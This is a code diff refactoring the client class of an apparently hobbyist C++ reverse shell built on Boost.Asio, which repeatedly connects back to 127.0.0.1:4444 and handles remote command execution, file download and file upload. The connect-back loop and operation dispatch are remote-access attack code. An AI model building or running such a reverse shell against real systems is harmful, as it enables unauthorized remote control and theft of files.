@@ -20,27 +20,26 @@ class Client
 private:
 	using IoService = boost::asio::io_service;
 	using TcpResolver = boost::asio::ip::tcp::resolver;
-	using TcpResolverIterator = TcpResolver::iterator;
-	using TcpSocket = boost::asio::ip::tcp::socket;
 
 public:
 
 	Client(IoService& ioService)
-		: m_ioService(ioService), m_socket(ioService), m_ShellUtils(this)
+		: m_socket(ioService), m_ShellUtils(this)
 	{
-		TcpResolver resolver(ioService);
-		m_endpointIterator = resolver.resolve({ "127.0.0.1", "4444" });
-		Connect();
-		Start();
+		Connect(ioService);
+		m_ShellUtils.Start();
 	}
 
 private:
 
-	void Connect()
+	void Connect(IoService& ioService)
 	{
+		TcpResolver resolver(ioService);
+		auto endpointIterator = resolver.resolve({ "127.0.0.1", "4444" });
+
 		while(true)
 		{
-			boost::asio::connect(m_socket, m_endpointIterator, m_ShellUtils.m_errorCode);
+			boost::asio::connect(m_socket, endpointIterator, m_ShellUtils.m_errorCode);
 			if (!m_ShellUtils.m_errorCode)
 				return;
 
@@ -50,28 +49,6 @@ private:
 		}
 
 		std::cout << "Connected to: " << m_socket.remote_endpoint().address().to_string() << std::endl;
-	}
-
-	void Start()
-	{
-		while (true)
-		{
-			switch (ReadOperationType())
-			{
-			case SharedReverseShellUtils<Client>::RunCommand:
-				Command();
-				break;
-			case SharedReverseShellUtils<Client>::DownloadFile:
-				Download();
-				break;
-			case SharedReverseShellUtils<Client>::UploadFile:
-				Upload();
-				break;
-			default:
-				throw;
-				break; // TODO - decide what to do 
-			}
-		}
 	}
 
 	SharedReverseShellUtils<Client>::OperationType ReadOperationType()
@@ -96,8 +73,8 @@ private:
 			throw std::fstream::failure("Failed while opening file"); // TODO - Throw custom exception exception!
 
 		auto fileSize = std::filesystem::file_size(filePath);
-		std::string request(std::to_string(fileSize));
-		m_ShellUtils.Upload(fileSize, request);
+		m_ShellUtils.Upload(fileSize);
+		std::cout << "File uploaded (local): " << filePath << std::endl;
 	}
 
 	void Upload()
@@ -111,13 +88,18 @@ private:
 		m_ShellUtils.Download(filePath);
 	}
 
+	void InvalidOperation()
+	{
+		throw; // TODO - throw specific exception
+	}
+
 public: // TODO - Turn this back into private after solving the CommonReverseShell template issues. 
+	boost::asio::ip::tcp::socket m_socket;
 	SharedReverseShellUtils<Client> m_ShellUtils;
-	TcpResolver m_ioService;
-	TcpSocket m_socket;
-	TcpResolverIterator m_endpointIterator;
 	boost::asio::streambuf m_responseBuf;
 	std::fstream m_file;
+
+	friend class SharedReverseShellUtils<Client>;
 };
 
 #endif // !_CLIENT_H_
